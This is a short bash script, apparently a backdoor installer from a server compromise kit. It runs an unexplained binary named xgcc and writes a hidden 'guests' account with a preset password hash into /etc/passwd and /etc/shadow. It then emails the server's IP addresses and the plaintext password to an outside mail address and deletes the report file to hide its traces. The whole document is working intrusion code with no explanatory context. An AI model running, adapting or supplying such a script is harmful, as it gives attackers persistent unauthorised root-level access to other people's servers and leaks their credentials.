#!/bin/bash
USER='guests:x:2012:2012::/usr/dt:/bin/sh'
MAIL='magnet@tv2mail.hu'
STRN='guests:$1$TKNjHFAo$usoR2ZazE57AWkaWf8Cpl0:11107:7:91:28:::'
WORD='753951741'
        ./xgcc;mkdir /usr/dt >>/dev/null 2>&1;
	touch /usr/dt/dtinfo;
	echo $USER >> /etc/passwd;
        echo $STRN >> /etc/shadow;
        chown guests /usr/dt;

if test -n |grep $STRN /etc/shadow >>/dev/null 2>&1

then
       echo 'This server:'`/sbin/ifconfig |grep addr:`' is back-dored with user:'"$USER" >> /usr/dt/dtinfo 2>&1 ;
       echo  'Password is set to:'"$WORD" >> /usr/dt/dtinfo 2>&1 ; 
       mail -s "guests" $MAIL < /usr/dt/dtinfo;
       rm -rf /usr/dt/dtinfo
 

else
clear
/usr/bin/id
echo "Finish"
fi
